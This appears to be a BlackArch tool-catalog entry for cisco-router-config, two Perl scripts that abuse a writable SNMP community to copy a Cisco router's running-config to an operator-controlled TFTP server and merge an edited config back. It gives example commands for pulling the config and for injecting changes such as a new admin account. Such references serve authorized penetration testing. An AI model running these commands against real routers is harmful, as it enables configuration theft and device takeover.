---
name: "cisco-router-config"
categories:
  - blackarch-misc
version: "1.1"
homepage: ""
packaged-by: [blackarch]
blackarch-builddate: "2025-07-18"
build-system: perl
license: GPL
meta-checked: "2026-11-09"
github-repo: "foreni-packages/copy-router-config"
github-stars: 2
github-pushed: "2015-09-20"
github-archived: false
github-issues: 0
github-match: "search"
gh-checked: "2026-11-09"
worth: 1.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# cisco-router-config

> Pull a Cisco IOS router's running-config to your TFTP server over SNMP, then merge a modified config back in.

*No corpus evidence — derived from upstream documentation.*

## What it's for

Two Perl scripts by muts (Offensive Security) — copy-router-config.pl and
merge-router-config.pl — that exploit a read-write SNMP community string on a
Cisco IOS device. Working over SNMP-directed TFTP (they wrap the Perl module
Cisco::CopyConfig), copy-router-config.pl exfiltrates the device's running-config
to `pwnd-router.config` on a TFTP server you control, and merge-router-config.pl
merges that file from your TFTP root back into the running-config — the classic
path to injecting local admin accounts. Both need a TFTP server rooted at /tmp
and a writable community string that you already know; the scripts do not guess
or crack SNMP credentials.

## Typical use cases

### Exfiltrate a router's running-config

Pull the live configuration off a device with a known read-write community.

```
copy-router-config.pl 198.51.100.10 198.51.100.99 private
```

Outcome: directs the router over SNMP to copy its running-config to
`pwnd-router.config` in the TFTP root on 198.51.100.99, printing `OK` on success
or the module's error message on failure. Edit the file that lands in your TFTP
root before the merge step.

### Merge a modified config back into the router

Push the edited configuration into the device.

```
merge-router-config.pl 198.51.100.10 198.51.100.99 private
```

Outcome: merges `pwnd-router.config` from the TFTP root into the router's
running-config, printing `OK` on success. Added statements (for example a new
local username) take effect immediately; verify the config took with a show
run on the device.

*GitHub: `foreni-packages/copy-router-config` is a third-party mirror of the Debian-packaged scripts — both .pl files sha512-identical to the ones BlackArch bundles; stat fields predate this link and await recompute.*
